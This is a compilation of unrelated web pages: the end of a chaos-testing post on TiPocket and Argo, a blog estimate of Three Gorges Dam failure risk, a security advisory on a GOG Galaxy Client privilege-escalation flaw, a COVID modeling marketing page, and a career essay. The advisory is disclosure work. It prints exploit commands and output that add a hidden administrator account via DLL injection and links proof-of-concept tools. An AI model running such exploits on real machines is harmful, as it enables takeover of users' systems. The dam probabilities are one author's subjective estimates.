pipeline.</li><li><strong>Cron Workflow</strong> lets you schedule a workflow like a cron job. It is perfectly suitable for scenarios where you want to run test tasks for a long time.</li></ul><p>The sample workflow for our predefined bank test is shown below:</p><div><div><div tabindex="0"><div><p><span>spec</span><span>:</span><span></span></p><p><span>  </span><span>entrypoint</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>  </span><span>arguments</span><span>:</span><span></span></p><p><span>    </span><span>parameters</span><span>:</span><span></span></p><p><span>      </span><span>-</span><span> </span><span>name</span><span>:</span><span> ns</span></p><p><span>        </span><span>value</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p><p><span>            </span><span>-</span><span> </span><span>name</span><span>:</span><span> nemesis</span></p><p><span>        </span><span>value</span><span>:</span><span> random_kill</span><span>,</span><span>kill_pd_leader_5min</span><span>,</span><span>partition_one</span><span>,</span><span>subcritical_skews</span><span>,</span><span>big_skews</span><span>,</span><span>shuffle</span><span>-</span><span>leader</span><span>-</span><span>scheduler</span><span>,</span><span>shuffle</span><span>-</span><span>region</span><span>-</span><span>scheduler</span><span>,</span><span>random</span><span>-</span><span>merge</span><span>-</span><span>scheduler</span></p><p><span>  </span><span>templates</span><span>:</span><span></span></p><p><span>    </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>      </span><span>steps</span><span>:</span><span></span></p><p><span>        </span><span>-</span><span> </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>wait</span><span>-</span><span>cluster</span></p><p><span>            </span><span>templateRef</span><span>:</span><span></span></p><p><span>              </span><span>name</span><span>:</span><span> wait</span><span>-</span><span>cluster</span></p><p><span>              </span><span>template</span><span>:</span><span> wait</span><span>-</span><span>cluster</span></p><p><span>        </span><span>-</span><span> </span><span>-</span><span> </span><span>name</span><span>:</span><span> call</span><span>-</span><span>tipocket</span><span>-</span><span>bank</span></p><p><span>            </span><span>templateRef</span><span>:</span><span></span></p><p><span>              </span><span>name</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p><p><span>              </span><span>template</span><span>:</span><span> tipocket</span><span>-</span><span>bank</span></p></div></div></div></div><p>In this example, we use the workflow template and nemesis parameters to define the specific failure to inject. You can reuse the template to define multiple workflows that suit different test cases. This allows you to add more customized failure injections in the flow.</p><p>Besides <a href="https://github.com/pingcap/tipocket/tree/master/argo/workflow" target="_blank" rel="noopener noreferrer">TiPocket’s</a> sample workflows and templates, the design also allows you to add your own failure injection flows. Handling complicated logics using codable workflows makes Argo developer-friendly and an ideal choice for our scenarios.</p><p>Now, our chaos experiment is running automatically. But if our results do not meet our expectations? How do we locate the problem? TiDB saves a variety of monitoring information, which makes log collecting essential for enabling observability in TiPocket.</p><h2>Visualizing the results: Loki</h2><p>In cloud-native systems, observability is very important. Generally speaking, you can achieve observability through <strong>metrics</strong>, <strong>logging</strong>, and <strong>tracing</strong>. TiPocket’s main test cases evaluate TiDB clusters, so metrics and logs are our default sources for locating issues.</p><p>On Kubernetes, Prometheus is the de-facto standard for metrics. However, there is no common way for log collection. Solutions such as <a href="https://en.wikipedia.org/wiki/Elasticsearch" target="_blank" rel="noopener noreferrer">Elasticsearch</a>, <a href="https://fluentbit.io/" target="_blank" rel="noopener noreferrer">Fluent Bit</a>, and <a href="https://www.elastic.co/kibana" target="_blank" rel="noopener noreferrer">Kibana</a> perform well, but they may cause system resource contention and high maintenance costs. We decided to use <a href="https://github.com/grafana/loki" target="_blank" rel="noopener noreferrer">Loki</a>, the Prometheus-like log aggregation system from <a href="https://grafana.com/" target="_blank" rel="noopener noreferrer">Grafana</a>.</p><p>Prometheus processes TiDB’s monitoring information. Prometheus and Loki have a similar labeling system, so we can easily combine Prometheus' monitoring indicators with the corresponding pod logs and use a similar query language. Grafana also supports the Loki dashboard, which means we can use Grafana to display monitoring indicators and logs at the same time. Grafana is the built-in monitoring component in TiDB, which Loki can reuse.</p><h2>Putting them all together - TiPocket</h2><p> Now, everything is ready. Here is a simplified diagram of TiPocket:</p><p><img src="https://chaos-mesh.org/img/tipocket-architecture.png" alt="TiPocket Architecture"></p><p>As you can see, the Argo workflow manages all chaos experiments and test cases. Generally, a complete test cycle involves the following steps:</p><ol><li>Argo creates a Cron Workflow, which defines the cluster to be tested, the faults to inject, the test case, and the duration of the task. If necessary, the Cron Workflow also lets you view case logs in real-time.</li></ol><p><img src="https://chaos-mesh.org/img/argo-workflow.png" alt="Argo Workflow"></p><ol><li>At a specified time, a separate TiPocket thread is started in the workflow, and the Cron Workflow is triggered. TiPocket sends TiDB-Operator the definition of the cluster to test. In turn, TiDB-Operator creates a target TiDB cluster. Meanwhile, Loki collects the related logs.</li><li>Chaos Mesh injects faults in the cluster.</li><li>Using the test cases mentioned above, the user validates the health of the system. Any test case failure leads to workflow failure in Argo, which triggers Alertmanager to send the result to the specified Slack channel. If the test cases complete normally, the cluster is cleared, and Argo stands by until the next test.</li></ol><p><img src="https://chaos-mesh.org/img/alert_message.png" alt="Alert in Slack"></p><p>This is the complete TiPocket workflow. .</p><h2>Join us</h2><p><a href="https://github.com/pingcap/chaos-mesh" target="_blank" rel="noopener noreferrer">Chaos Mesh</a> and <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">TiPocket</a> are both in active iterations.

        <h2><a href="http://thinking.farm/research/three-gorges-dam/">To Dam or Not to Dam: Exploring the Failure Risk of the Three Gorges Dam </a></h2>
            
            <section id="single-content">
                <p><em>This research explores the risk that the Three Gorges dam will experience failure.
I believe the risk that the dam becomes structurally compromised, and requires the government to drain the reservoir to undertake repairs, is  <strong>20-25%</strong>. In the case that there is a seismic event, that likelihood would be closer to <strong>80%</strong>. I put the chance of a dam failure during this summer’s ongoing floods at <strong>5-10%</strong>, rising to <strong>30%</strong> in the case of a seismic event.</em></p>
<h2 id="introduction">Introduction</h2>
<p>Did Wuhan commit a great crime in 2019? How else to explain the cityâ€™s bad luck in 2020, beginning with the COVID-19 world pandemic and continuing with recent worries that the Three Gorges Dam (TGD), the worldâ€™s largest, might burst and flood the city? News reports about the dam have primarily been journalists repeating the opinions of various experts, with some quotes dating back to the 1990s. Predictably, this has encouraged the formation of two camps: those primed towards conspiratorial speculation that the Chinese Communist Party is lying about a looming catastrophe, and those that repeat state media lines that rumors about the dam are the work of Chinaâ€™s foreign enemies.</p>
<p>Nonetheless, I think that clear thinking about risk can help us assess the likelihood of disaster at the TGD. The dam is subject to three types of risks:</p>
<ol>
<li>structural integrity risk, which originates in the damâ€™s construction and maintenance</li>
<li>foundation risk, which reflects the geologic stability of the damâ€™s foundation</li>
<li>shock risk, which the likelihood that an external shock occurs, like an earthquake or landslide.</li>
</ol>
<p>Structural integrity risk is hard to assess, but we can obtain relatively clear information to assess foundation and shock risk, if we make use of valuable geologic data gathered by the Three Gorges Development Corporation in the 1990s. Moreover, the changing rhetoric of press releases from the Chinese government can reveal how the authorities themselves, who have live access to the state of the dam, are mitigating these risks. The governmentâ€™s behavior can then further calibrate our sense of how large and realized these risks actually are.</p>
<p>I have been unable to come by reliable information to assess the structural integrity of the dam. The major risk to the dam comes from foundation risk. As can be ascertained from geologic data, Sections 1-5 of the left powerhouse lie on top of a low-dipping joints with high connectivity, meaning that there is elevated sliding risk. The damâ€™s recent deformation on July 21 means previously calculated safety ratios are likely inflated. Moreover, changes in government rhetoric support this suspicion. In contrast to years past, the government claims that the dam was never mean to control floods and that each region should figure out their own solution.</p>
<p>In terms of shock risk, the dam is susceptible to seismic activity, instability arising from the sheer weight of the TGD reservoir, and flood waves large enough to overwhelm the damâ€™s sluice gates. As of writing (July 26), the 3rd flood wave has officially formed in the Yangtze, and a 4th might appear in short succession. Overall, I think there is a 20-25% chance that the dam is further structurally impaired, prompting the government to continue draining the reservoir as fast as possible. There is something like a 5-10% chance that multiple flood waves overwhelm the dam and raise the reservoir level. These would weaken the dam or its foundation and cause a sliding failure. Were an earthquake to happen this month, these risks would be something more like 80% and 30%.</p>
<h2 id="anatomy-of-a-dam">Anatomy of a dam</h2>
<p>There are several types of dam design: arch dams, buttress dams, embankment dams, and gravity dams.</p>
<p>Arch dams hold back the water partially through the strength of their structural shape. The Hoover Dam is an example of an arch dam. The arch is convex facing upstream, which distributes water pressure along the structure to the abutments at each end.</p>
<figure>
    <img src="http://thinking.farm/hoover-dam.jpg" width="100%"> <figcaption>
            <h4>The Hoover Dam, Arizona-Nevada border</h4>
        </figcaption>
</figure>

<p>Buttress dams consist of a face slab which angles away from the upstream, and is supported on the downstream side by buttress structures. These structures are attached to a base slab foundation. Buttress dams are built in areas with looser soil foundations.</p>
<figure>
    <img src="http://thinking.farm/daniel-johnson.jpg" width="100%"> <figcaption>
            <h4>The Daniel-Johnson Buttress Dam, Canada</h4>
        </figcaption>
</figure>

<p>Embankment dams are built up by the piling up of soil, rocks, or synthetic materials. These are usually porous on their outside but have an impervious core. Their main advantage is their low cost and flexibility, which allows them to adjust to shifts in the embankment or settlement of the foundation over time.</p>
<p>Gravity dams resist water flow through their sheer weight, which pulls them vertically down and allows them to resist the horizontal force of water pressure along their surface. This is similar to what a child does when he blocks a stream or rivulet by piling rocksâ€”they divert the water flow not through any structural design but through their weight. This is the origin of the name â€œgravity dam.â€�</p>
<p>A U.S. Department of the Interior report in 1998 explored various dam â€œeventsâ€�. These include four gravity dams in the United States and one in France<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. All five suffered damage due to sliding, and two of them failed entirely. The remaining three required additional drainage, reinforcements, and the release of reservoir waters to keep water depths low. For example, the Morris Shepherd Dam suffered sliding because the initial loading of the reservoir changed the stability of the bedrock foundation such that the safety ratio fell below 1.0. In other words, the load that the dam could support before failing had fallen below the regular load the dam was supposed to hold.</p>
<h2 id="foundation-risk-is-sliding-risk">Foundation risk is sliding risk</h2>
<p>The most important factor in sliding events is the nature of the bedrock on which a gravity dam is built. In failures of this type, the part of the foundation on which the dam rests slides downstream. We have reliable data to study this phenomenon, though media and news commentators have not put in the work.</p>
<p>In 2003 scientists from the Chinese Academy of Sciences and the Yangtze River Scientific Research Institute received data and support from the Three Gorges Development Corporation, the Changjiang Water Resources Commission, and the Chinese Academy of Sciences to conduct a stability assessment of the damâ€™s foundation using physical and numerical modeling.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>The study incorporated a variety of techniques for the stability assessment, including conventional methods of geological mapping such as borehole drilling and shaft exploration, geophysical prospecting such as acoustic emission, remote sensing, seismic reflection and refraction, electromagnetic techniques, and physical-chemical analysis and micro-structural analysis. Most of these data are recorded in expensive studies commissioned in 1998 and 1999, when the dam was being built.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<p>They conclude that the â€œmajor factor influencing the foundation stability would come from the pre-existing discontinuities. However, among these discontinuities the faults mostly have steep dip angles, thin thickness, and well-cemented tectonite, so they would not play important roles in the foundation stability.â€�</p>
<h2 id="foundation-faults-and-joints">Foundation, faults, and joints</h2>
<p>The foundation is plagioclase granite which is homogenous and of high strength, and with various degrees of weathering, though the dam itself is on the moderately and lightly weathered parts.</p>
<p>The are 886 faults in the granite, most of which have steep angles (i.e. they go down more than sideways). 90% of these are shorter than 300 meters and narrower than 1 meter. Most of the faults are filled in with tectonite, a metamorphic type of rock.</p>
<p>The granite also has a very large number of joints. Joints are fractures where the two sides, unlike in a fault, lack visible or detectable movement relative to each other. 13% of joints have dip angles less than 30 degrees, 10% are between 30-60, and 77% are greater than 60 degrees.</p>
<p>The low-dipping joints have been studied more than the others because they dip downstream at an angle low enough to create sliding surfaces in the damâ€™s foundation. This was determined to be the greatest risk to foundation stability.</p>
<p>As we can see in the illustration below, the area of greatest risk is labeled â€œrelative developed regions of gently dipping joints,â€� which is where these low dipping joints are present in both long and short form, and in high densities. This area crosses the dam around the left powerhouse, which also overlaps with one of the large faults.</p>
<figure>
    <img src="http://thinking.farm/rock-joint-distribution.png" width="100%"> <figcaption>
            <h4>Rock joint distribution along the foundation of Three Gorges Dam (Liu et al)</h4>
        </figcaption>
</figure>

<p>Another risk factor is connectivity: the percentage of joints that could form a potential sliding path. The higher the connectivity, the higher the probability that a disturbance will link the joints into a fracture that produces a sliding event.</p>
<figure>
    <img src="http://thinking.farm/layout-of-tgd.png" width="100%"> <figcaption>
            <h4>Layout of the TGD and the numbered left powerhouse-dam sections (Liu et al)</h4>
        </figcaption>
</figure>

<p>Sections 1-5 of the left powerhouse dam are the weakest links. As can be seen below, the density of low-dipping joints is highest under Section No. 3 of the left powerhouse dam. Even more unfortunately, Section No. 3 also has the highest joint connectivityâ€”80% of the joints are in a potential sliding path!</p>

            <h4>Avg. linear density of low-dipping joints, and connectivity, for Sections No. 1-5 (Liu et al)</h4>

<p>We can appreciate the high connectivity of the joints under Section No. 3 through the geological sketches from Liu et al.</p>

        <h2><a href="https://www.positronsecurity.com/blog/2020-08-13-gog-galaxy_client-local-privilege-escalation_deuce/">GOG Galaxy Client Local Privilege Escalation Deuce</a></h2>
        
        <p>I reported <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">a serious local privilege escalation flaw in GOG Galaxy Client</a> on April 28, 2020, but my follow-up investigation (detailed below) found the vendor’s fix to be insufficient.  By updating the proof-of-concept exploit code, it is possible to execute arbitrary commands as <em>SYSTEM</em> in GOG Galaxy Client v2.0.13 through <s>v2.0.15</s> v2.0.19 (the latest as of this writing).</p>
<p>GOG did not reply that this issue was officially fixed, although changes were silently made at some point after the v2.0.15 release to stop the provided proof-of-concept tools from working.  <s>It is suspected that only minor changes were made to frustrate exploitation; an investigation is ongoing</s> (See update below).</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): After an investigation, it was found that GOG simply updated the signing key used for verifying messages.  This key has been recovered, and the proof-of-concept has been updated with it.  This advisory now describes a <strong>0-day vulnerability in GOG Galaxy Client v2.0.19</strong> because GOG did not respond in good faith with a proper patch in 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google’s vulnerability disclosure policy</a> (which GOG was made aware of during the initial contact; see Vendor Timeline, below).</p>
<h3>Investigation of Prior Patch</h3>
<p>The day before issuing my <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a> on April 28, 2020, I ran the proof-of-concept exploits against the fixed versions (v1.2.67 and v2.0.14).  They no longer worked.  Unfortunately, because GOG never told me the issues were actually fixed on February 27, 2020, I didn’t have a chance to do an in-depth follow-up investigation before publishing the advisory.  I’ve since had the chance to look at their fix more deeply.</p>
<p>To start, I looked at the log file at <em>C:\ProgramData\GOG.com\Galaxy\logs\GalaxyClientService.log</em> to see if it reports anything when the old exploit is run.  I found this:</p>
<pre><code>2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Received a message from process connected at '127.0.0.1:54963'.
2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Determined sender to be 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.7_3.7.2032.0_x64__qbz5n2kfra8p0\python.exe' (PID: 8448)
2020-05-08 15:03:53.503 [Warning][#1 (1)] [TID 7352][galaxy_service]: The sender was not recognized as a trusted client.
2020-05-08 15:03:53.503 [Error][#1 (1)] [TID 7352][galaxy_service]: Received a forbidden request from an untrusted sender. Disconnecting.
</code></pre>
<p>That’s a big hint!  It looks like the privileged process, <em>GalaxyClientService.exe</em>, matches the network client’s source TCP port number with the executable process that opened the socket.  That’s how it figures out that the request is coming from the Python interpreter instead of the legitimate client (GalaxyClient.exe).</p>
<p>I immediately thought that this check can be circumvented with <a href="https://en.wikipedia.org/wiki/DLL_injection">DLL injection</a>.</p>
<h3>Updating the Proof-of-Concept</h3>
<p><em>Cue hours of re-implementing my Python proof-of-concept in C…</em></p>
<p>Ok, now I have a DLL that can be injected into <em>GalaxyClient.exe</em> which will issue the same HMAC-512-signed request as before.  Let’s test it out:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "user jtesta Abc*123Lol /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 10296
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Looks like it worked!  Ok, now let’s add this new user to the local <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "localgroup Administrators jtesta /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 8112
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Let’s verify that this user exists and is part of the <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;net user jtesta
User name                    jtesta
[...]
Local Group Memberships      *Administrators       *Users
[...]
The command completed successfully.
</code></pre>
<p><strong>SUCCESS!</strong></p>
<h3>Proof-Of-Concept Exploit Tools</h3>
<p>Pre-compiled binaries and source code for the updated proof-of-concept tools (which work on GOG Galaxy v2.0.13 through v2.0.19) are available here: <a href="https://www.positronsecurity.com/blog/gog_galaxy_updated_poc_v2.zip">gog_galaxy_updated_poc_v2.zip</a> (<a href="https://www.positronsecurity.com/blog/gog_galaxy_updated_poc_v2.zip.sig">gog_galaxy_updated_poc_v2.zip.sig</a>)</p>
<p>GPG Key: <a href="https://www.positronsecurity.com/company/jtesta.asc">jtesta.asc</a> (9C61 F6A9 A3E9 BCA0 04A6  3C66 E44F 5FD3 B799 916A)</p>
<h3>Vendor Contact Timeline</h3>
<p><strong>May 12, 2020</strong>: Contact with GOG.com Support was made using the same ticket (#535258) as the <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a>.</p>
<p><strong>June 4, 2020</strong>: GOG.com Support replied with:</p>
<p>“I was informed that our Developers are working on fixing the issue, but executing the attack requires the machine to be already compromised.”</p>
<p>Because this sounded like GOG was not taking the issue seriously, I responded with:</p>
<p>“It is indeed true that an attacker must have low-privilege access to the machine already.  But the problem is that this can be escalated into Administrator rights by abusing the GalaxyClientService software.  […]  Local privilege escalation (LPE) is a serious vulnerability.  GOG customers may install software/games from other untrusted sources without Administrator rights, which normally would protect them from full system compromise.  Unfortunately, due to the vulnerabilities I’ve discovered in GalaxyClientService, <em>all</em> user accounts are effectively administrators.”</p>
<p><strong>August 13, 2020</strong>: No response received from vendor after 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google’s vulnerability disclosure policy</a> (which GOG was informed of).  GOG did not reply with any fix information.</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): <em>After</em> this advisory was publicly released, GOG.com Support responded with:</p>
<p>“Our Developers reevaluated the reported issue and think that it will take them around 3 months to create a solution, because it demands a major design change.  Would it be possible to postpone the public release of your findings by 3 months so they have time to implement and test this solution?”</p>
<p>Because this was received after the advisory was already published, the request was deemed moot.</p>
<h3>Explanation of 0-Day Exploit Release</h3>
<p>(Section added on Aug. 13, 2020 @ 5:11PM)</p>
<p>As of the time of original publication (the morning of August 13), the proof-of-concept tool released worked on v2.0.13 - v2.0.15 only; it did not work on the latest version (v2.0.19) for unknown reasons.  Hours later, an investigation revealed that GOG silently updated the message-signing key some time between the release of v2.0.16 and v2.0.19 in order to prevent the exploit from working.  This was not a good-faith attempt at addressing the security vulnerability for two reasons:</p>
<p>1.) As <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">my first GOG Galaxy Client advisory clearly showed</a>, secret keys cannot be used to verify messages, since an attacker can easily extract those keys.  GOG already knew since January that this would not solve the core design problem.</p>
<p>2.) In private communication on May 12, I made note that I strongly suspected this would require an extensive re-design, and that I would be happy to help (for free) to ensure that a proper &amp; comprehensive fix would be shipped to end users.  No response regarding this offer was received (in fact, no response was received at all until the deadline had passed).</p>
<p>Because it reasonably seems that GOG is no longer acting in good-faith regarding this matter, I’ve updated the proof-of-concept again with the new signing key.  Hence, as of August 13, <strong>this is a 0-day vulnerability affecting GOG Galaxy Client v2.0.19</strong>.</p>

<blockquote><em>“We are living in a very challenging time as we plan for 8,000 people to return to our district (1,000 employees and 7,000 students) in seven short weeks. Data is critical to our success as we strive to balance health and safety with face-to-face interactions.” </em><br><em>-Darcie Mosley, Millcreek School District Superintendent</em></blockquote>

<div><p>COVID-19 represents an unprecedented challenge for K-12 educators and administrators who must make crucial reopening decisions under conditions of significant uncertainty. As the pandemic rages across the country, educational leaders have to consider the impact of every decision on students, teachers, parents, and the larger community they serve.</p><p>Questions school districts face include: When and how to open safely for students, teachers, and staff? What are the impacts on parents, extended families, the local economy, and the larger community? How to effectively compare and contrast different reopening policies, and which policy is best one for their particular school district? How should policies differ across elementary, middle, and high schools? What is the best way to update policies as new data become available? </p><p>These dilemmas are further complicated by the fact that epidemiological risk factors vary enormously based on local conditions, limiting the efficacy of broad, standardized policy responses, and that districts have few avenues by which to learn from each other’s experience. With so many lives and livelihoods at stake, decision makers need better tools to inform their choices.</p><p>Epistemix is working to help fill that gap.</p><p>Our team has spent decades building epidemiological models to combat infectious diseases in partnership with the National Institutes of Health, Bill and Melinda Gates Foundation, Robert Wood Johnson Foundation, and others. Now, we’re working with schools, health care systems, Fortune 500s, nonprofits, researchers, and federal, state, and local governments to respond to COVID-19.</p><p>Using data from the US Census, Department of Education, American Community Survey, and Bureau of Labor Statistics, our synthetic population matches actual local population statistics and demographics, and, unlike many equation-based models that lack the flexibility and granularity to compare the implications of actual policy interventions below the county level, our agent-based model uses realistic social dynamics to simulate epidemiological outcomes from the bottom-up to show the policy impact neighborhood by neighborhood across the country.</p><p>That specificity is crucial for districts trying to evaluate the relative merits of alternative school reopening strategies, focusing on health outcomes for students, teachers and the community. Using epidemiological best practice, we can model the specific, local consequences of different reopening policies on students, families, staff and the community—including the number of local COVID-19 cases, hospitalizations, and deaths most likely to result from each strategy. Our simulations account for every individual in a particular region as well as the households, schools, workplaces, disease progression, social-behavioral data, and regulations specific to that geography.</p><p>The researchers behind Epistemix studied student-student interactions and contact patterns in Pennsylvania schools when developing the platform by having students wear trackers and record journals of who they were in contact with and where those interactions took place during the day. This is one of the only studies of this kind and ours is the only software that accounts for this level of detail when modeling different policy outcomes. This study enables the Epistemix team to account for differences in grade level interactions throughout the school day and in the classroom.</p><p>Every model we build is designed to inform a specific choice the district is facing. We begin by calibrating our COVID-19 disease model to the specific local outbreak pattern, taking into account local closure rules, social distancing behavior, school closure orders, and other local events. In the images below, you can see how we fit our model to the actual disease history of Allegheny County in Pennsylvania—note that in the Total Cases graph on the right, because reported cases are always a fraction of actual cases, our model is likely to be more accurate than the county’s figures.</p></div>

<div><p>Once the initial model is calibrated to local conditions, we run scenarios for the particular reopening strategies the district is considering, for example: opening schools as normal, moving everything online, or reducing time spent in school by 50% by breaking students into cohorts. The model then maps out the implications of these strategies under community conditions like the stage of the epidemic and the number of cases in the county, broad social distancing measures like stay at home orders and masks, and macro-dynamics revealed by population density and mobility scores. The model then generates the number of cases, hospitalizations, deaths, and healthcare resources resulting from each strategy under consideration.</p><p>In the charts below, you can see the implications if all the Allegheny County school districts reduced physical attendance by 50%—how many students and teachers would be infected in school and how many infections would lead to hospitalized cases under three levels of community conditions.</p></div>

<div><p>These outputs arm superintendents with the analytics they need to implement the right policies for their districts. At its best, modeling isn’t about prediction, but insight. It makes assumptions explicit, provides shared context for discussion, and informs high-stakes decisions. It reveals counterintuitive ways in which COVID-19 interacts with the complex adaptive systems that are our schools and communities, and the steps we can take to make things better. <a href="https://f.hubspotusercontent10.net/hubfs/5670167/Epistemix__Schools_Report_Example.pdf" rel=" noopener">For more details, download a complete sample report here.</a></p><p>This data-driven approach to evaluating reopening strategies helps districts safeguard students, teachers, staff, families, and communities. In addition to modeling individual policy interventions, Epistemix is coordinating across districts to establish a network of superintendents and school leaders that can share best-practice in real-time as we continue to learn and adapt to the pandemic—tracking the efficacy of different approaches across similar districts.</p><p>So, how can we help <em>your</em> district? </p><p>For K-12 schools, Epistemix can model the impacts of different reopening policy options and provide grade-by-grade results for school district teams based on the district’s geography, number of students, population density, and reported cases in the county. For Epistemix to build and run a model for your district and community, district leaders will need to provide basic information including opening plans and contingencies, location of each school, number of students per grade per school, number of teachers and staff, and age ranges of teachers and staff (age is a major COVID-19 risk factor).&nbsp;Epistemix has been working with PA schools, hospital systems, and the state government on modeling various social distancing policies, business reopenings, social gatherings (e.g. high school football to Pittsburgh Pirates baseball games), and interactions between COVID-19 and other diseases like measles, flu, and pertussis.</p></div>

<p>I was chatting with a friend, and the topic of making it in the software development industry came up. They were concerned that programming is so hard to break into and takes a long time, so they asked for a backup plan thatâ€™s in high demand but doesnâ€™t involve coding and isnâ€™t over-saturated like development. This perturbation led me to question their motives for getting into software in the first place. Iâ€™ll walk you through the most common wrong reasons to enter into this field, along with how to evaluate alternative options.</p>
<h2 id="everyones-doing-it">everyoneâ€™s doing it</h2>
<p>Following the herd only leads to stampedes. The sentiment of this market as saturated is dangerous to the degree that itâ€™s both accurate and inaccurate. Demand for these positions seems to grow without limit, suggesting that we have yet to hit a saturation point. At the same time, thereâ€™s been a torrential flood of new programmer supply from coding bootcamps, online tutorials, and remote workers the world over. The mismatch here is that most of the supply of new developers is at a junior skill level, but the bar for in-demand skills keeps rising higher toward the senior level.</p>
<h2 id="easy-peasy">easy peasy</h2>
<p>Another misconception stems from the belief that because developers perform their work on computers that it must be easy to do. After all, the rest of the world is mostly using these devices to watch cat videos, surf the rabbit hole of search results for a given topic, play games, and check their email. The only tricky part that those outside the industry tend to identify is the amount of typing performed, which seems trivial for anyone in a field involving large amounts of writing. The actual difficulty for programmers lies in the creative parts of the work that occur inside the developerâ€™s mind, and thus, are unseen. With few exceptions, most software engineering involves building new or modifying existing things to perform tasks they have never done before. There may be a software design in place, but itâ€™s more of a vague notion and less of a blueprint.</p>
<p>A successful developer will need to keep adapting their design when continuously thrown curveballs upon discovering new unknowns or changing requirements. Excellent developers will understand the business problems they are solving, and make decisions aligned with what will give their software the best chance for success. Truly superb developers also have top-notch communication skills to ensure their work fits seamlessly with the greater whole and are proactive about helping teammates who are stuck. This unique combination of creative and technical abilities is scarce and not easy to acquire.</p>
<h2 id="money">money</h2>
<p>Itâ€™s no secret that software is among the top paid careers, right after the medical professions. Combine high pay with far more affordable education options from bootcamps to free learning materials, and the choice appears to be a win-win. Beware of those offering income share agreements or high-interest loans to fund this form of learning. Even if you utilize entirely free information, thereâ€™s still the opportunity cost of what you could be doing with all the time you spent educating yourself. Just because thereâ€™s good money to be made doesnâ€™t make you any more qualified to make it. Become a developer if youâ€™re incredibly motivated or already possess the skills mentioned above to advance quickly beyond a junior skill level, but please donâ€™t do it for the money or just because other people are doing it.</p>
<h2 id="alternatives">alternatives</h2>
<p>Writing software isnâ€™t for everyone, but using software is what gives you leverage to automate your work and grow beyond what you can accomplish alone. If you write that software, youâ€™re trading your time for the full amount of that leverage. If you buy the software, youâ€™re paying for a portion of it. As long as your productivity improvement exceeds that softwareâ€™s cost, youâ€™re getting a good deal. More and more companies find themselves in the business of automation through software to survive in todayâ€™s economy. You may bypass the need for some software skills, but donâ€™t expect to escape them all.</p>
<p>There are many in-demand fields, so itâ€™s easier to start searching for alternatives from what youâ€™re already good at and love doing and then find which of those pay well. This trifecta of factors commonly is referenced as the best combination for making a successful career.</p>
<p><img src="https://words.okwolf.com/images/career-venn-diagram.png" alt=""></p>
<p>If you have yet to master anything that pays well, then your path is less certain. Some will start from what pays well and work backward, however that has a high likelihood of falling into the <a href="#money">money trap</a> of software development. Others will begin with what they love, but beware, not all passions make good careers. The best approach is from where you already have the most talent, even if youâ€™re struggling with applying it in ways that you enjoy and pay the bills.</p>
<p>Thereâ€™s no magic wand that instantly transports you to the intersection of this Venn diagram in the center. Many times honing your craft wonâ€™t be fun until you reach a certain level of proficiency. In these cases, thereâ€™s no substitute for trusting the process and persevering through your doubts. Even if you donâ€™t find success along the first course you set, you will learn about yourself along the journey. If you pay attention to the lessons life offers you, you will continue to make progress, the most any of us can hope for.</p>
